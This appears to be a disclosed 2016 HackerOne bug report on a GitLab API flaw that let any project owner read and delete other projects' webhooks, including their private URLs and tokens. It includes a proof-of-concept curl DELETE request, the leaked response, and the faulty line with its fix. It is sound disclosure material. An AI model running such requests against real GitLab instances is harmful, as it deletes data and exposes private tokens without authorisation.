@@ -1,0 +1,43 @@
+ReportLink:https://hackerone.com/reports/134292
+WeaknessName:Privilege Escalation
+Reporter:https://hackerone.com/jobert
+ReportedTo:GitLab(gitlab)
+BountyAmount:
+Severity:
+State:Closed
+DateOfDisclosure:03.05.2016 1:00:03
+
+Summary:
+
+# Vulnerability details
+An attacker can delete and read webhooks that are configured for all projects on a GitLab instance. This includes private projects. This is a bad vulnerability because these webhooks contain private (API) tokens most of the time.
+
+# Proof of concept
+As a victim, create a project and a webhook. Make sure you know the unique ID of the webhook. You can find this by looking at the "Test hook" button. In this example, the ID is `1`. Now as the attacker, which doesn't have access to the webhook, create another project. Since the attacker is the owner of this project, it can send API requests to `/projects/:id` and access its sub resources. By executing the following cURL request command, the webhook of the victim can be destroyed and read:
+
+```bash
+curl -X DELETE --header "PRIVATE-TOKEN: XXXXXXXXXXX" "http://gitlab-instance/api/v3/projects/2/hooks/1"
+```
+
+The attacker has access to project with ID 2, but the webhook with ID 1 belongs to a different project (see the response below). The response leaks the private webhook URL and on which events it would be fired. The request deletes the webhook, but the attacker can now keep digging with the leaked webhook URL.
+
+```json
+{
+  "id":1,
+  "url":"http://secret.com/",
+  "project_id":24,
+  "created_at":"2016-04-24T22:16:58.044Z",
+  "updated_at":"2016-04-24T22:16:58.044Z",
+  "service_id":null,
+  "push_events":true,
+  "issues_events":false,
+  "merge_requests_events":false,
+  "tag_push_events":false,
+  "note_events":false,
+  "enable_ssl_verification":true,
+  "build_events":false
+}
+```
+
+# Fix
+The problem arises from `lib/api/project_hooks.rb:104`. Instead of calling `user_project.hooks.find`, it searches in all project hooks to fetch the object: `ProjectHook.find`. I attached the fix for this problem.
